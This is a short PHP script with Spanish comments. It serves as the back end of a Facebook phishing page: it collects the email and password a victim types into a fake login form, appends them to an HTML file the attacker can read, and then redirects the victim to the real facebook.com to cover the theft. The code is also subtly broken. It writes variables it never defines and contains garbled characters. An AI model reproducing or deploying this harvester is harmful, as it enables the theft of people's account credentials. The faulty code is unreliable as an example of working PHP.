<?

#run.php

//Asigna el valor de las variables del usuario y contraseÒa

$usuario=$_POST['email_desktop'];

$contraseÒa=$_POST['pass_desktop'];



// Asigna el valor a la variable donde se guarda el correo y pass de la victima

$guardame=fopen('leeme.html','a+');

fwrite($guardame,

"<br/><b>Email:</b>".$email_desktop.

"<br/><b>Contrasena:</b>".$cpass_desktop." ");

fclose($guardame);



//Redireccione a la web original (Facebook)

echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"

?>?